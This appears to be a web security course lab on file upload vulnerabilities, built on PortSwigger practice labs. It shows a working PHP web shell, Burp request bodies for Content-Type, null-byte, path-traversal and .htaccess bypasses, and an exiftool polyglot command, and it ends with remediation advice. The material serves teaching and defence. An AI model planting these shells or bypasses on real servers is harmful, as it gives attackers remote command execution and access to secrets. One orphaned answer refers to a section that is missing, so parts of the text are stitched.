Lab 06: File Upload Vulnerabilities & Web Shells

Every lab so far stayed inside the application: the database, the browser, another user's cart. Today an uploaded file breaks out onto the operating system. You'll deploy a PHP web shell, defeat six progressively harder upload and path defenses, and see how a single URL-decoding gap lets you pull protected files off disk.

1. How an Uploaded File Becomes an OS Shell

🔥
Case Study: 147 Million Records Exposed via an Unpatched Web Framework

In May 2017, attackers hit Equifax's consumer dispute portal through an Apache Struts flaw (CVE-2017-5638, CVSS 10.0) where a crafted HTTP Content-Type header got parsed as OGNL code and executed OS commands on the server. They dropped web shells to hold access and moved across internal networks for 76 days before detection, exposing Social Security numbers and personal data for roughly 147 million people.

The patch had been out since March 7, 2017. That whole breach relied on the exact foothold you build today: getting a web server to execute attacker-supplied code on the host OS.

Source: U.S. House Committee on Oversight and Government Reform: The Equifax Data Breach (Dec 2018) ↗

A web server handles a requested file in one of two completely different ways. It either reads a static file off disk and ships the raw bytes back, or it hands an executable script (like .php) to an interpreter that runs the code on the server's operating system and returns the output.

STATIC FILE SERVING vs. SERVER-SIDE EXECUTION OWASP A02 · MITRE T1505.003

Static File (cat.jpg)

bytes only 
GET /files/avatars/cat.jpg HTTP/1.1
→ Apache reads bytes from disk
→ sends Content-Type: image/jpeg
→ nothing runs on the server

Even if a .jpg file contains <?php ... ?> text inside it, a normal server treats it as image data and never hands it to PHP.

Web Shell (exploit.php)

runs on OS 
GET /files/avatars/exploit.php?cmd=id HTTP/1.1
→ Apache sees .php, invokes PHP interpreter
→ PHP calls system("id") in /bin/sh
→ stdout returns in the HTTP 200 body

That single line, <?php system($_GET['cmd']); ?>, turns an upload folder into a remote command prompt running as the web user.

HOW A WEB REQUEST EXECUTES ON THE UNDERLYING LINUX HOST
🤔 An avatar form rejects shell.php because only image extensions are allowed. You rename the exact same PHP file to shell.jpg and the upload succeeds. When you browse to /files/avatars/shell.jpg, do you get code execution?
Answer

No. Unless the web server is misconfigured to pass .jpg files through PHP, Apache serves shell.jpg as raw bytes and your PHP code sits there unread. Getting code execution requires a file that both clears the upload filter and still gets executed by an interpreter.

3. Defeating Metadata Filters: Content-Type & Poison Null Bytes (%00)

Once developers realize users can upload .php scripts, their first fix is checking the HTTP upload metadata: the Content-Type header or the filename suffix. Both belong to the client, and both lie easily.

Step 2a · Spoof the Content-Type Header in Burp Repeater MIME Header Bypass

Open PortSwigger's second lab: Lab: Web shell upload via Content-Type restriction bypass ↗. Uploading exploit.php fails with a message saying only image/jpeg or image/png MIME types are allowed. Send POST /my-account/avatar to Burp Repeater and change only the part's Content-Type line:

Burp Repeater · keep filename="exploit.php", lie about Content-Type
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: image/jpeg          # changed from application/x-php or application/octet-stream

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary7MA4YWxkTrZu0gW--

The server trusts the browser-supplied Content-Type header, saves exploit.php onto disk, and Apache executes it via GET /files/avatars/exploit.php?cmd=cat+/home/carlos/secret because the filename ends in .php.

What If the Filter Checks the Filename Extension Instead?

When a server ignores Content-Type and checks the filename ending, a single string needs to end in .jpg at the filter and end in .php on disk. In C-style file APIs and URL-decoded paths, the Null Byte (hex 0x00, URL-encoded as %00) means "stop reading the string here."

1. High-Level Suffix Filter

Reads Full String 
filename = "exploit.php%00.jpg"
→ checks ending of string: ".jpg"
→ Result: ALLOWED ✅

High-level validation checks whether the filename ends with an image extension (.jpg or .png) before decoding special bytes.

2. Low-Level File Save Handler

Stops at 0x00 
decodes %00 → \x00 (null terminator)
→ reads left-to-right: "exploit.php\x00.jpg"
→ drops ".jpg", writes "exploit.php" 💥

When the backend decodes %00 while writing to disk, everything after the null byte vanishes and Apache receives an executable .php file.

🤔 Now the upload endpoint rejects anything whose filename doesn't end in JPG or PNG. Using the null-byte terminator you just saw, what exact filename in Burp's Content-Disposition header satisfies the .jpg check while saving as exploit.php?
Answer

exploit.php%00.jpg. The upload validator sees .jpg at the end, then the save routine decodes %00 and truncates the rest, writing exploit.php on disk.

Step 2b · Bypass Extension Validation with %00 Extension Bypass

Open PortSwigger's third lab: Lab: Web shell upload via obfuscated file extension ↗. Upload exploit.php, catch the blocked POST /my-account/avatar in Burp Repeater, and rewrite the filename:

Burp Repeater · single %00 works inside multipart headers
Content-Disposition: form-data; name="avatar"; filename="exploit.php%00.jpg"
Content-Type: application/x-php

Notice the confirmation says exploit.php was uploaded (proving truncation at %00). Request GET /files/avatars/exploit.php?cmd=cat+/home/carlos/secret to solve it. Keep a mental note that single %00 worked here because it sat inside a multipart/form-data body header; in Section 5 you'll see what happens when you try single %00 inside a URL path instead.

4. Advanced Defenses: Non-Executable Folders, .htaccess & Image Polyglots

Harder targets don't stop at checking Content-Type or the filename suffix. They disable script execution inside the upload folder, blacklist PHP extensions altogether, or parse the uploaded bytes to verify a real image. Each defense still breaks if one assumption fails.

Step 3a · Escape a Non-Executable Folder via Path Traversal (..%2f) Folder Escape

Open PortSwigger's fourth lab: Lab: Web shell upload via path traversal ↗. Upload exploit.php and request GET /files/avatars/exploit.php: the server returns your raw PHP source code as plain text instead of running it, because PHP execution is disabled inside /files/avatars/.

  1. Test raw traversal: In Burp Repeater on POST /my-account/avatar, set filename="../exploit.php". The response says The file avatars/exploit.php has been uploaded, proving the app stripped the literal ../ prefix.
  2. Obfuscate the slash: URL-encode / as %2f so the prefix filter misses it while the filesystem still resolves the parent directory:
    Burp Repeater · climb out of /files/avatars/ into /files/
    Content-Disposition: form-data; name="avatar"; filename="..%2fexploit.php"
Content-Type: application/x-php

<?php system($_GET['cmd']); ?>
  3. The response confirms The file avatars/../exploit.php has been uploaded. Request GET /files/exploit.php?cmd=cat+/home/carlos/secret (one folder up, where PHP execution is still enabled) to solve the lab.
Step 3b · Defeat a .php Blacklist via Two-Stage .htaccess Upload Config Override

Open PortSwigger's fifth lab: Lab: Web shell upload via extension blacklist bypass ↗. Uploading exploit.php fails outright, and the HTTP response headers show an Apache server. If a blacklist blocks .php (plus common variants like .php5, .phtml, .phar) but forgets server config files, you can teach Apache to execute a custom extension instead:

  1. Stage 1 · Upload a directory config override: Send POST /my-account/avatar to Burp Repeater, set filename=".htaccess" and Content-Type: text/plain, and map .l33t to Apache's PHP handler:
    Burp Repeater · Upload #1 (.htaccess rules for /files/avatars/)
    Content-Disposition: form-data; name="avatar"; filename=".htaccess"
Content-Type: text/plain

AddType application/x-httpd-php .l33t
  2. Stage 2 · Upload your shell under the new extension: Use the back arrow in Repeater, change filename="exploit.php" to filename="exploit.l33t" containing <?php system($_GET['cmd']); ?>, and send it.
  3. Request GET /files/avatars/exploit.l33t?cmd=cat+/home/carlos/secret. Because of your .htaccess file, Apache runs .l33t through PHP and prints the secret.
Other blacklist bypasses pentesters check before .htaccess

Before rewriting server config, pentesters test overlooked PHP extensions (.phtml, .phar, .php5, .phps), mixed case (.pHp), trailing dots/spaces on Windows IIS hosts, or double extensions (exploit.php.jpg when Apache's legacy AddHandler matches anywhere in the name). On IIS servers, uploading web.config serves the same role as .htaccess.

Step 3c · What If the Server Checks the Actual File Contents?

When an upload endpoint inspects the binary bytes of your upload instead of just the filename or headers, a plain text file starting with <?php gets rejected. You bypass content checks with a polyglot: one file that is valid as both an image and a PHP script at the same time.

Quick Bypass: Magic-Byte Checks

First 4–6 Bytes 
GIF89a<?php system($_GET['cmd']); ?>

When a server only checks opening magic bytes (47 49 46 38 39 61 = GIF89a, 89 50 4E 47 = PNG, FF D8 FF = JPEG), prepending GIF89a fools signature checks like finfo_file() while PHP echoes GIF89a and executes the tag.

Full Image Check: EXIF Polyglot

Valid JPEG + PHP 
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" avatar.jpg -o polyglot.php

When a server uses getimagesize() to validate full image headers and pixel dimensions, a 6-byte prefix fails. Injecting PHP inside a real JPEG's EXIF Comment field satisfies every image parser while PHP still scans the binary and executes <?php ... ?>.

Practice · Solve PortSwigger's Polyglot Lab with exiftool Binary Polyglot

Open PortSwigger's sixth lab: Lab: Remote code execution via polyglot web shell upload ↗. Run the exiftool command above on any local .jpg to produce polyglot.php, upload it as your avatar, then fetch GET /files/avatars/polyglot.php in Burp Repeater and search the raw JPEG binary response for START to read Carlos's secret before END.

No exiftool installed? You can embed <?php echo 'START '; system($_GET['cmd']); echo ' END'; ?> inside a real JPEG's EXIF comment or use a hex editor after the JPEG comment marker (FF FE) so the image structure remains intact. Notice why strict defenses re-encode uploads (via GD/ImageMagick) into brand-new images: re-encoding strips metadata blocks completely.

Answer

Single %00 gets decoded at the front door into a raw null byte and rejected with 400 Bad Request. To make %00 survive one round of URL-decoding, encode the % sign itself (% = hex 25 → %25), sending package.json.bak%2500.md.

6. Write the Finding & How Developers Fix File Upload RCE

When an upload bug lets an attacker execute arbitrary server-side code on the host, severity jumps straight to Critical. Here's how to document the finding and eliminate every bypass vector at once.

SeverityCritical · CVSS 9.1 (authenticated file upload leading to RCE as the web server user)

Steps to reproduce1. Upload exploit.php containing <?php system($_GET['cmd']); ?> (bypassing naive filters via spoofed Content-Type: image/jpeg, null byte filename="exploit.php%00.jpg", traversal filename="..%2fexploit.php", two-stage .htaccess upload, or EXIF polyglot).
2. Request GET /files/avatars/exploit.php?cmd=id (or /files/exploit.php) → returns the web server user's UID/username (e.g., www-data) and allows reading /home/carlos/secret.
ImpactArbitrary OS command execution on the application host as the web server user, exposing application secrets, database credentials, and internal network pivot paths.
RemediationEnforce a strict extension allowlist, verify and re-encode image bytes server-side, generate a random UUID/hex filename instead of trusting client filename, and store uploads outside the web root (or on object storage) with script execution disabled.

Notice how every attack today exploited trusting client-supplied data: Content-Type, filename, image metadata, or an unescaped URL path. Never let the server store a client-chosen name or execute files from a user-writable directory.
